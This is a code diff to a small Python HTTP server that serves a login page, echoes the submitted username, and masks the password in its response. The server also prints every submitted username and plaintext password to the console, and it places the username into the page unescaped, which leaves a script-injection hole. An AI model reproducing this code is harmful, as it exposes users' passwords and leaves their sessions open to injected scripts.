@@ -65,20 +65,22 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
             output += "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
             output += "<link rel=\"stylesheet\" href=\"./css/style.css\">"
             output += "<link rel=\"icon\" type=\"image/x-icon\" href=\"/images/WT_logo.ico\">"
+            output += "<script src=\"./js/back.js\"></script>"
             output += "<title>Login Page</title>"
             output += "</head>"
-            output += "<body>"
+            output += "<form align=\"center\">"
             output += f"<p>Username: {parse.unquote(uname)} <br>"
             output += f"Password: {mask(parse.unquote(pword))} <br>"
-            output += "</p></body></html>"
+            output += "<button type=\"button\" onclick = \"back()\" >Back</button>"
+            output += "</p></form></html>"
 
             print(f"INFORMATION:\nUsername:\t{parse.unquote(uname)}\nPassword:\t{parse.unquote(pword)}\n")
             self.wfile.write(bytes(output, "utf-8"))
             return
 
 
-IP = '10.22.27.113' # Change this to current IP Address
-PORT = 8000
+IP = '192.168.1.106' # Change this to current IP Address
+PORT = 80
 Handler = ServerHandler
 document_root = './'
 
